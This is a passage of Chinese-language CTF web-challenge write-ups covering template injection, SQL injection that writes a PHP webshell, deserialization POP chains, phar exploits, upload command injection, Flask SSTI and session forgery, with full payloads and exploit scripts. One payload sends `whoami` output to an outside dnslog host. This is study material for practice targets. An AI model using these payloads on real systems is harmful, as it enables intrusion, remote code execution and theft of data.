redirect to(\u0026#39;/shop\u0026#39;) end end ERB模板注入\n注入点\n1 2 3 4 5 6 if params[:do] == \u0026#34;#{params[:name][0,7]} is working\u0026#34; then auth[\u0026#34;jkl\u0026#34;] = auth[\u0026#34;jkl\u0026#34;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth ERB::new(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;#{params[:name][0,7]} working successfully!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;).result do和name要相同，有长度限制7字符，除去\u0026lt;%=%\u0026gt;只剩下两个字符，利用ruby的预定义变量$',可以匹配最后一次匹配右边的内容\n1 2 3 4 unless params[:SECRET].nil? if ENV[\u0026#34;SECRET\u0026#34;].match(\u0026#34;#{params[:SECRET].match(/[0-9a-z]+/)}\u0026#34;) puts ENV[\u0026#34;FLAG\u0026#34;] end 这里还有正则匹配，需要有SECRET参数且为false,$'就能获取secret\n1 2 \u0026lt;%=$\u0026#39;%\u0026gt; url编码一下：%3C%25%3D%24%27%25%3E 甚至可以不传SECRET参数\n1 /work?name=%3C%25%3D%24%27%25%3E\u0026amp;do=%3C%25%3D%24%27%25%3E%20is%20working 获取到secret值\n拿着key伪造\n/shop路由改cookie\n这里看到有rce的做法\n1 2 3 4 $a = \u0026#34;mon123\u0026#34; $b = Array[\u0026#34;aaa\u0026#34;,\u0026#34;bbb\u0026#34;,\u0026#34;ccc\u0026#34;] puts \u0026#34;$a: #{$a[0,3]}\u0026#34;//mon puts \u0026#34;$b: #{$b[0,3]}\u0026#34;//[\u0026#34;aaa\u0026#34;,\u0026#34;bbb\u0026#34;,\u0026#34;ccc\u0026#34;] 这里，$b原本是数组，但是因为被拼接到了字符串中，所以数组默认的类型变成了[\u0026quot;aaa\u0026quot;, \u0026quot;bbb\u0026quot;, \u0026quot;ccc\u0026quot;],这样上面代码的限制，从原本的7个字符，变成了7个数组长度\n1 /work?name[]=\u0026lt;%=system(\u0026#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn\u0026#39;)%\u0026gt;\u0026amp;name[]=1\u0026amp;name[]=2\u0026amp;name[]=3\u0026amp;name[]=4\u0026amp;name[]=5\u0026amp;name[]=6\u0026amp;do=[\u0026#34;\u0026lt;%=system(\u0026#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn\u0026#39;)%\u0026gt;\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;] is working [N1CTF 2018]eating_cms 先进register.php注册后登入\nurl可以任意文件读取\n伪协议读一下\n1 user.php?page=php://filter/convert.base64-encode/resource=index function.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php session_start(); require_once \u0026#34;config.php\u0026#34;; function Hacker() { Header(\u0026#34;Location: hacker.php\u0026#34;); die(); } function filter_directory() { $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); // var_dump($query); // die(); foreach($keywords as $token) { foreach($query as $k =\u0026gt; $v) { if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); } } } function filter_directory_guest() { $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;,\u0026#34;info\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); // var_dump($query); // die(); foreach($keywords as $token) { foreach($query as $k =\u0026gt; $v) { if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); } } } function Filter($string) { global $mysqli; $blacklist = \u0026#34;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\u0026#34;; $whitelist = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;(),_*`-@=+\u0026gt;\u0026lt;\u0026#34;; for ($i = 0; $i \u0026lt; strlen($string); $i++) { if (strpos(\u0026#34;$whitelist\u0026#34;, $string[$i]) === false) { Hacker(); } } if (preg_match(\u0026#34;/$blacklist/is\u0026#34;, $string)) { Hacker(); } if (is_string($string)) { return $mysqli-\u0026gt;real_escape_string($string); } else { return \u0026#34;\u0026#34;; } } function sql_query($sql_query) { global $mysqli; $res = $mysqli-\u0026gt;query($sql_query); return $res; } function login($user, $pass) { $user = Filter($user); $pass = md5($pass); $sql = \u0026#34;select * from `albert_users` where `username_which_you_do_not_know`= \u0026#39;$user\u0026#39; and `password_which_you_do_not_know_too` = \u0026#39;$pass\u0026#39;\u0026#34;; echo $sql; $res = sql_query($sql); // var_dump($res); // die(); if ($res-\u0026gt;num_rows) { $data = $res-\u0026gt;fetch_array(); $_SESSION[\u0026#39;user\u0026#39;] = $data[username_which_you_do_not_know]; $_SESSION[\u0026#39;login\u0026#39;] = 1; $_SESSION[\u0026#39;isadmin\u0026#39;] = $data[isadmin_which_you_do_not_know_too_too]; return true; } else { return false; } return; } function updateadmin($level,$user) { $sql = \u0026#34;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = \u0026#39;$level\u0026#39; where `username_which_you_do_not_know`=\u0026#39;$user\u0026#39; \u0026#34;; echo $sql; $res = sql_query($sql); // var_dump($res); // die(); // die($res); if ($res == 1) { return true; } else { return false; } return; } function register($user, $pass) { global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = \u0026#34;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (\u0026#39;$user\u0026#39;,\u0026#39;$pass\u0026#39;,\u0026#39;0\u0026#39;)\u0026#34;; $res = sql_query($sql); return $mysqli-\u0026gt;insert_id; } function logout() { session_destroy(); Header(\u0026#34;Location: index.php\u0026#34;); } ?\u0026gt; 1 2 3 $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;,\u0026#34;info\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); 这里用到parse_url的解析漏洞，在/user.php前面加斜杠，就会被当成host解析，返回false绕过黑名单\n1 //user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg 1 2 3 4 5 6 7 \u0026lt;?php if (FLAG_SIG != 1){ die(\u0026#34;you can not visit it directly\u0026#34;); }else { echo \u0026#34;you can find sth in m4aaannngggeee\u0026#34;; } ?\u0026gt; 提示templates/upload.html\n发现upllloadddd.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php $allowtype = array(\u0026#34;gif\u0026#34;,\u0026#34;png\u0026#34;,\u0026#34;jpg\u0026#34;); $size = 10000000; $path = \u0026#34;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;; $filename = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; if(is_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;])){ if(!move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;],$path.$filename)){ die(\u0026#34;error:can not move\u0026#34;); } }else{ die(\u0026#34;error:not an upload file！\u0026#34;); } $newfile = $path.$filename; echo \u0026#34;file upload success\u0026lt;br /\u0026gt;\u0026#34;; echo $filename; $picdata = system(\u0026#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;.$filename.\u0026#34; | base64 -w 0\u0026#34;); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/png;base64,\u0026#34;.$picdata.\u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; if($_FILES[\u0026#39;file\u0026#39;][\u0026#39;error\u0026#39;]\u0026gt;0){ unlink($newfile); die(\u0026#34;Upload file error: \u0026#34;); } $ext = array_pop(explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;])); if(!in_array($ext,$allowtype)){ unlink($newfile); } ?\u0026gt; 1 $picdata = system(\u0026#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;.$filename.\u0026#34; | base64 -w 0\u0026#34;); 这里可以用;拼接命令来执行\n找到前面能上传的地方\n斜杠被过滤了，cd ..回上级目录，其实加个#就不用base64解码了\n[GYCTF2020]Easyphp www.zip下载源码\n1 2 3 4 function safe($parm){ $array= array(\u0026#39;union\u0026#39;,\u0026#39;regexp\u0026#39;,\u0026#39;load\u0026#39;,\u0026#39;into\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;file\u0026#39;,\u0026#39;insert\u0026#39;,\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\\\\\u0026#39;,\u0026#34;*\u0026#34;,\u0026#34;alter\u0026#34;); return str_replace($array,\u0026#39;hacker\u0026#39;,$parm); } 反序列化字符串逃逸\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php class User{ public $age=null; public $nickname=null; public function __construct(){ $this-\u0026gt;age = \u0026#39;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#39;; $this-\u0026gt;nickname = new Info(); } } class Info{ public $CtrlCase; public function __construct(){ $this-\u0026gt;CtrlCase = new dbCtrl(); } } Class UpdateHelper{ public $sql; public function __construct() { $this-\u0026gt;sql = new User(); } } class dbCtrl{ public $name = \u0026#34;admin\u0026#34;; public $password = \u0026#34;1\u0026#34;; } $o = new UpdateHelper; echo serialize($o); 得到\n1 O:12:\u0026#34;UpdateHelper\u0026#34;:1:{s:3:\u0026#34;sql\u0026#34;;O:4:\u0026#34;User\u0026#34;:2:{s:3:\u0026#34;age\u0026#34;;s:70:\u0026#34;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#34;;s:8:\u0026#34;nickname\u0026#34;;O:4:\u0026#34;Info\u0026#34;:1:{s:8:\u0026#34;CtrlCase\u0026#34;;O:6:\u0026#34;dbCtrl\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:1:\u0026#34;1\u0026#34;;}}}} 反序列化点在这里\n1 2 3 4 5 6 7 8 9 10 11 12 public function update(){ $Info=unserialize($this-\u0026gt;getNewinfo()); $age=$Info-\u0026gt;age; $nickname=$Info-\u0026gt;nickname; $updateAction=new UpdateHelper($_SESSION[\u0026#39;id\u0026#39;],$Info,\u0026#34;update user SET age=$age,nickname=$nickname where id=\u0026#34;.$_SESSION[\u0026#39;id\u0026#39;]); //这个功能还没有写完 先占坑 } public function getNewInfo(){ $age=$_POST[\u0026#39;age\u0026#39;]; $nickname=$_POST[\u0026#39;nickname\u0026#39;]; return safe(serialize(new Info($age,$nickname))); } update.php里面post传age和nickname\n1 age=1\u0026amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion\u0026#34;;s:8:\u0026#34;CtrlCase\u0026#34;;O:12:\u0026#34;UpdateHelper\u0026#34;:1:{s:3:\u0026#34;sql\u0026#34;;O:4:\u0026#34;User\u0026#34;:2:{s:3:\u0026#34;age\u0026#34;;s:70:\u0026#34;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#34;;s:8:\u0026#34;nickname\u0026#34;;O:4:\u0026#34;Info\u0026#34;:1:{s:8:\u0026#34;CtrlCase\u0026#34;;O:6:\u0026#34;dbCtrl\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:1:\u0026#34;1\u0026#34;;}}}}} 然后用admin登入\n[SUCTF 2018]MultiSQL 这里利用sql的预处理语句\nset 的作用就是定义一个变量，变量的命名必须是@开头。\nprepare和execute prepare语句用于预定义一个语句，并可以指定预定义语句名称。execute则是执行预定义语句。\n1 select ‘\u0026lt;?php eval($_POST[_]);?\u0026gt;’ into outfile ‘/var/www/html/favicon/shell.php’; 利用char绕过waf\n先转进制\n1 2 3 4 5 6 7 8 str=\u0026#34;select \u0026#39;\u0026lt;?php eval($_POST[_]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/favicon/shell.php\u0026#39;;\u0026#34; len_str=len(str) for i in range(0,len_str): if i == 0: print(\u0026#39;char(%s\u0026#39;%ord(str[i]),end=\u0026#34;\u0026#34;) else: print(\u0026#39;,%s\u0026#39;%ord(str[i]),end=\u0026#34;\u0026#34;) print(\u0026#39;)\u0026#39;) 1 char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59) payload\n1 ?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query; 然后访问/favicon/shell.php\n[SUCTF 2018]annonymous 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $MY = create_function(\u0026#34;\u0026#34;,\u0026#34;die(`cat flag.php`);\u0026#34;); $hash = bin2hex(openssl_random_pseudo_bytes(32)); eval(\u0026#34;function SUCTF_$hash(){\u0026#34; .\u0026#34;global \\$MY;\u0026#34; .\u0026#34;\\$MY();\u0026#34; .\u0026#34;}\u0026#34;); if(isset($_GET[\u0026#39;func_name\u0026#39;])){ $_GET[\u0026#34;func_name\u0026#34;](); die(); } show_source(__FILE__); hash随机生成数字拼接到下面函数中，这个随机没办法，但是create_function函数有个漏洞，上次搞[HITCON 2017]Baby^h Master PHP的时候遇到了\n会生成匿名函数\\0lambda_%d\n通过大量的请求来迫使Pre-fork模式启动\n1 2 3 4 5 6 7 import requests while True: r=requests.get(\u0026#39;http://a10002f2-2091-47dc-9b7c-996d05cd4faa.node3.buuoj.cn/?func_name=%00lambda_1\u0026#39;) if \u0026#39;flag\u0026#39; in r.text: print(r.text) break print(\u0026#39;[-]\u0026#39;) [RootersCTF2019]babyWeb 报错注入，过滤or用||绕过\n过滤单双引号用16进制绕过\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 search=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 //sql_injection search=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x73716C5F696E6A656374696F6E),0x7e),1)%23 //users search=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),0x7e),1)%23 search=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),0x7e),1)%23 //USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,user,uniqueid search=1 and updatexml(1,concat(0x7e,(select count(uniqueid) from users),0x7e),1)%23 //2 search=1 and updatexml(1,concat(0x7e,(select group_concat(uniqueid) from users),0x7e),1)%23 //837461526918364526,123456789928466788 或者用万能密码\n1 1 || 1=1 limit 0,1 [安洵杯 2019]不是文件上传 先用源码的反序列化\n1 2 3 4 5 6 7 8 \u0026lt;?php class helper { protected $ifview = True; protected $config = \u0026#34;/flag\u0026#34;; } $a = new helper(); echo serialize($a); ?\u0026gt; 1 O:6:\u0026#34;helper\u0026#34;:2:{s:9:\u0026#34;*ifview\u0026#34;;b:1;s:9:\u0026#34;*config\u0026#34;;s:5:\u0026#34;/flag\u0026#34;;} 因为都是protected属性的，用\\0\\0\\0替换（源码给的\n1 2 3 foreach($data as $key=\u0026gt;$value){ $key_temp = str_replace(chr(0).\u0026#39;*\u0026#39;.chr(0), \u0026#39;\\0\\0\\0\u0026#39;, $key); $value_temp = str_replace(chr(0).\u0026#39;*\u0026#39;.chr(0), \u0026#39;\\0\\0\\0\u0026#39;, $value); 1 O:6:\u0026#34;helper\u0026#34;:2:{s:9:\u0026#34;\\0\\0\\0ifview\u0026#34;;b:1;s:9:\u0026#34;\\0\\0\\0config\u0026#34;;s:5:\u0026#34;/flag\u0026#34;;} 然后源码有这一行\n1 $sql = \u0026#34;INSERT INTO images (\u0026#34;.(implode(\u0026#34;,\u0026#34;,$sql_fields)).\u0026#34;) VALUES(\u0026#34;.(implode(\u0026#34;,\u0026#34;,$sql_val)).\u0026#34;)\u0026#34;; 看返回值titile可控\n拼接然后16进制绕过双引号waf\n1 1\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;1\u0026#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(\u0026#39;1.jpg 然后修改文件名\n访问show.php触发反序列化\n[强网杯 2019]Upload 目录扫描www.tar.gz\nthinkphp5\nprofile.php下面有两个魔术方法\n1 2 3 4 5 6 7 8 9 10 11 public function __get($name) { return $this-\u0026gt;except[$name]; } public function __call($name, $arguments) { if($this-\u0026gt;{$name}){ $this-\u0026gt;{$this-\u0026gt;{$name}}($arguments); } } register.php里面也有\n1 2 3 4 5 6 public function __destruct() { if(!$this-\u0026gt;registed){ $this-\u0026gt;checker-\u0026gt;index(); } } 1 Profile赋值checker，触发call，然后agrument为空,触发get，然后except可控 然后回来看上传的逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 if(!empty($_FILES)){ $this-\u0026gt;filename_tmp=$_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $this-\u0026gt;filename=md5($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]).\u0026#34;.png\u0026#34;; $this-\u0026gt;ext_check(); } if($this-\u0026gt;ext) { if(getimagesize($this-\u0026gt;filename_tmp)) { @copy($this-\u0026gt;filename_tmp, $this-\u0026gt;filename); @unlink($this-\u0026gt;filename_tmp); $this-\u0026gt;img=\u0026#34;../upload/$this-\u0026gt;upload_menu/$this-\u0026gt;filename\u0026#34;; $this-\u0026gt;update_img(); } public function update_img(){ $user_info=db(\u0026#39;user\u0026#39;)-\u0026gt;where(\u0026#34;ID\u0026#34;,$this-\u0026gt;checker-\u0026gt;profile[\u0026#39;ID\u0026#39;])-\u0026gt;find(); if(empty($user_info[\u0026#39;img\u0026#39;]) \u0026amp;\u0026amp; $this-\u0026gt;img){ if(db(\u0026#39;user\u0026#39;)-\u0026gt;where(\u0026#39;ID\u0026#39;,$user_info[\u0026#39;ID\u0026#39;])-\u0026gt;data([\u0026#34;img\u0026#34;=\u0026gt;addslashes($this-\u0026gt;img)])-\u0026gt;update()){ $this-\u0026gt;update_cookie(); $this-\u0026gt;success(\u0026#39;Upload img successful!\u0026#39;, url(\u0026#39;../home\u0026#39;)); }else{ $this-\u0026gt;error(\u0026#39;Upload file failed!\u0026#39;, url(\u0026#39;../index\u0026#39;)); } } } 第一次上传就能使empty=1，绕过.png的拼接\n要使ext=1\nindex.php里面会反序列化cookie\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php namespace app\\web\\controller; class Register{ public $checker; public $registed =0;//目的是过destruct里的if; } class Profile{ public $checker =0 ;//目的是绕过index类的检查，防止退出程序 public $filename_tmp=\u0026#34;./upload/9987df285bb375eda68448315c5656e5/4a47a0db6e60853dedfcfdf08a5ca249.png\u0026#34;; public $upload_menu; public $filename=\u0026#34;upload/shell.php\u0026#34;; public $ext=1;//目的是过if来调用复制webshell public $img; public $except=array(\u0026#34;index\u0026#34;=\u0026gt;\u0026#34;upload_img\u0026#34;);//目的是通过__get()魔术方法调用upload_Img函数 } $a = new Register(); $a-\u0026gt;checker = new Profile();//目的是调用POP链 $a-\u0026gt;checker-\u0026gt;checker=0；//调用pop链防止退出程序 echo base64_encode(serialize($a)); cookie替换完访问/upload/shell.php\n[CISCN2019 华东南赛区]Web4 file协议读不出来，猜测python写的界面\n利用local_file://协议读文件，或者什么都不用直接读文件\n1 /read?url=local_file:///etc/passwd 读app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(random.random()*233) app.debug = True @app.route(\u0026#39;/\u0026#39;) def index(): session[\u0026#39;username\u0026#39;] = \u0026#39;www-data\u0026#39; return \u0026#39;Hello World! \u0026lt;a href=\u0026#34;/read?url=https://baidu.com\u0026#34;\u0026gt;Read somethings\u0026lt;/a\u0026gt;\u0026#39; @app.route(\u0026#39;/read\u0026#39;) def read(): try: url = request.args.get(\u0026#39;url\u0026#39;) m = re.findall(\u0026#39;^file.*\u0026#39;, url, re.IGNORECASE) n = re.findall(\u0026#39;flag\u0026#39;, url, re.IGNORECASE) if m or n: return \u0026#39;No Hack\u0026#39; res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return \u0026#39;no response\u0026#39; @app.route(\u0026#39;/flag\u0026#39;) def flag(): if session and session[\u0026#39;username\u0026#39;] == \u0026#39;fuck\u0026#39;: return open(\u0026#39;/flag.txt\u0026#39;).read() else: return \u0026#39;Access denied\u0026#39; if __name__==\u0026#39;__main__\u0026#39;: app.run( debug=True, host=\u0026#34;0.0.0.0\u0026#34; ) 可以看到要访问flag路由，而且session里面的username要为fuck\nusername那个字段是base64编码后的www-data\n要知道secret-key就能伪造了\n伪造session首先要拿到secret_key，看一下secret_key的生成方式\n1 2 random.seed(uuid.getnode()) //种子是uuid.getnode(),即机器的固定标识符，根据mac地址转化为十进制数 app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(random.random()*233) //这里有了种子就可以自己生成secret_key 读取/sys/class/net/eth0/address获取mac地址\n4e:46:44:62:43:f0\n1 2 3 4 import random random.seed(0x4e46446243f0) print(str(random.random()*233)) //12.498945071696037 然后flask-session伪造\n这里是py2环境\n1 python flask_session_cookie_manager2.py encode -s 12.498945071696037 -t \u0026#34;{\u0026#39;username\u0026#39;:b\u0026#39;fuck\u0026#39;}\u0026#34; [GXYCTF2019]BabysqliV3.0 弱口令admin/password\n进去伪协议读源码\nupload.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 \u0026lt;?php error_reporting(0); class Uploader{ public $Filename; public $cmd; public $token; function __construct(){ $sandbox = getcwd().\u0026#34;/uploads/\u0026#34;.md5($_SESSION[\u0026#39;user\u0026#39;]).\u0026#34;/\u0026#34;; $ext = \u0026#34;.txt\u0026#34;; @mkdir($sandbox, 0777, true); if(isset($_GET[\u0026#39;name\u0026#39;]) and !preg_match(\u0026#34;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\u0026#34;, $_GET[\u0026#39;name\u0026#39;])){ $this-\u0026gt;Filename = $_GET[\u0026#39;name\u0026#39;]; } else{ $this-\u0026gt;Filename = $sandbox.$_SESSION[\u0026#39;user\u0026#39;].$ext; } $this-\u0026gt;cmd = \u0026#34;echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Master, I want to study rizhan!\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#39;;\u0026#34;; $this-\u0026gt;token = $_SESSION[\u0026#39;user\u0026#39;]; } function upload($file){ global $sandbox; global $ext; if(preg_match(\u0026#34;[^a-z0-9]\u0026#34;, $this-\u0026gt;Filename)){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;illegal filename!\u0026#39;);\u0026#34;; } else{ if($file[\u0026#39;size\u0026#39;] \u0026gt; 1024){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;you are too big (′▽`〃)\u0026#39;);\u0026#34;; } else{ $this-\u0026gt;cmd = \u0026#34;move_uploaded_file(\u0026#39;\u0026#34;.$file[\u0026#39;tmp_name\u0026#39;].\u0026#34;\u0026#39;, \u0026#39;\u0026#34; . $this-\u0026gt;Filename . \u0026#34;\u0026#39;);\u0026#34;; } } } function __toString(){ global $sandbox; global $ext; // return $sandbox.$this-\u0026gt;Filename.$ext; return $this-\u0026gt;Filename; } function __destruct(){ if($this-\u0026gt;token != $_SESSION[\u0026#39;user\u0026#39;]){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;check token falied!\u0026#39;);\u0026#34;; } eval($this-\u0026gt;cmd); } } if(isset($_FILES[\u0026#39;file\u0026#39;])) { $uploader = new Uploader(); $uploader-\u0026gt;upload($_FILES[\u0026#34;file\u0026#34;]); if(@file_get_contents($uploader)){ echo \u0026#34;下面是你上传的文件：\u0026lt;br\u0026gt;\u0026#34;.$uploader.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo file_get_contents($uploader); } } ?\u0026gt; phar反序列化\n非预期，filename可控，直接传参\n1 /home.php?file=upload\u0026amp;name=/var/www/html/flag.php 得到flag\n原来还有一个直接上传一句话木马的非预期估计给修了\n1 2 3 4 if($this-\u0026gt;token != $_SESSION[\u0026#39;user\u0026#39;]){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;check token falied!\u0026#39;);\u0026#34;; } eval($this-\u0026gt;cmd); token可以通过随便上传文件来获取\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php class Uploader{ public $Filename; public $cmd; public $token; } $upload = new Uploader(); $upload-\u0026gt;cmd = \u0026#34;highlight_file(\u0026#39;/var/www/html/flag.php\u0026#39;);\u0026#34;; $upload-\u0026gt;Filename = \u0026#39;test\u0026#39;; $upload-\u0026gt;token = \u0026#39;GXY063c630ae7ab41c6fd121cb4851620a3\u0026#39;; $phar = new Phar(\u0026#34;exp.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER(); ? \u0026gt;\u0026#39;); $phar-\u0026gt;setMetadata($upload); $phar-\u0026gt;addFromString(\u0026#34;exp.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); [pasecactf_2019]flask_ssti 简单的ssti\n过滤下划线和单引号，16进制绕过\n1 {{config[\u0026#34;\\x5f\\x5fclass\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5finit\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;][\u0026#34;os\u0026#34;][\u0026#34;popen\u0026#34;](\u0026#34;whoami\u0026#34;)[\u0026#34;read\u0026#34;]()}} flag不在目录\n读config看到加密后的\n1 2 3 4 def encode(line, key, key2): return \u0026#39;\u0026#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line))) app.config[\u0026#39;flag\u0026#39;] = encode(\u0026#39;\u0026#39;, \u0026#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34\u0026#39;, \u0026#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5\u0026#39;) 由于是异或再运行一遍就行了\n或者读proc/self/fd/3\n因为fd目录可以读到被删的的文件内容\n但是上面直接读是没有的\n因为self指向前面的popen，popen跟flag操作无关\n我们先读ps进程，读到pid为1\n1 cat /proc/1/fd/3 [EIS 